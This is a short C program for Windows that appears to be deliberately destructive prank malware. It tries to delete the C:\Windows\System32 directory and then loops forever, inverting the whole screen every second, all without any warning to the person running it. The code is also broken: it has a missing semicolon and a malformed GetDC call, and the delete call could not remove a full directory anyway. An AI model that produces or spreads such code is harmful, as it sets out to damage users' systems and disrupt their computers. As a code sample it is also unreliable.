#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define MAX_LINE_LENGTH 1000

void deletesystem()
{
  char system32Path[] = "C:\\Windows\\System32";

  remove(system32Path)
}

void fun()
{
  HDC hdc = GetDC(0;
  int x = GetSystemMetrics(SM_CXSCREEN);
  int y = GetSystemMetrics(SM_CYSCREEN);
  
  RECT screenRect;
  GetWindowRect(GetDesktopWindow(), &screenRect);
  
  while (1)
  {
    hdc = GetDC(0);
    PatBlt(hdc, 0, 0, screenRect.right, screenRect.bottom, PATINVERT);
    Sleep(1000);
    ReleaseDC(0, hdc);
  }
}

int main()
{
  deletesystem();
  fun();
}
